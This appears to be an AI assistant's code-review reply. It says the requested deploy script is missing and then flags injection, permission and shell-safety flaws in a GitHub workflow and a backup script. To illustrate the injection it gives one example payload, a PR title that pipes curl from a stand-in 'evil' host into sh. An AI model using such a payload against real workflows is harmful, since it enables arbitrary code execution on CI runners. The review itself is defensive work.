I can't review the deploy script you described, because it isn't in this workspace. Nothing here builds an ssh command from a branch name. I searched for `ssh ` across the repo and got no matches. The only shell script is `scripts/backup.sh`, and the only deploy-related file is `.github/workflows/deploy.yml`. Is the script on another branch, or in a file that isn't committed?

I did read what is here, and both files have problems you should fix before CI runs them.

**`.github/workflows/deploy.yml`**
- **Injection (line 14):** `run: echo "Title is ${{ github.event.pull_request.title }}"` puts the PR title straight into the shell. Anyone who can open a PR can run commands on the runner with a title like `"; curl evil|sh #`. This is the same flaw as interpolating a branch name into an ssh string. Pass the title through `env:` and quote it in the script (`"$PR_TITLE"`) instead.
- **Permissions (line 7):** `permissions: write-all` is far too broad for a workflow triggered by `pull_request`. Combined with the injection above, it gives an attacker a write-capable token. Use `contents: read`, and add only the scopes the job needs.
- **Pinning:** `actions/checkout@v4` is pinned to a tag, not a commit SHA. That's a lower-priority hardening step.

**`scripts/backup.sh`**
- **No strict mode:** there is no `set -Eeuo pipefail`. If `tar` fails, the script still runs `scp` and `rm`, and the failure is never reported.
- **Unquoted variables:** `$TMP`, `$DATA_DIR`, and the `scp` arguments are all unquoted. Use `"${TMP}"` and so on, and use `$(date +%F)` instead of backticks.
- **Predictable temp directory:** `/tmp/backup.$$` can be pre-created or symlinked by another local user. Use `mktemp -d`.
- **No cleanup on failure:** `rm -rf $TMP` only runs on the success path. Add `trap cleanup EXIT` before the `mktemp`.
- **Environment:** the script sets no `PATH` or `umask`, and the archive of `/srv/ledger/data` is created world-readable by default. Set `umask 077`.

When you find the real deploy script, the rule to apply is: never put the branch name into a string that `ssh` or `bash -c` re-parses. Check it against an allowlist pattern first, for example `^[A-Za-z0-9._/-]+$` with no leading `-`. Then send it to the remote side as an argument (`ssh host -- deploy.sh "$branch"`) and quote it again on the remote side. Or send it on stdin.

I haven't changed any files, and I haven't run shellcheck or `bash -n` on anything. If you want, I can fix `deploy.yml` and `backup.sh` now, or review the deploy script once you point me to it.
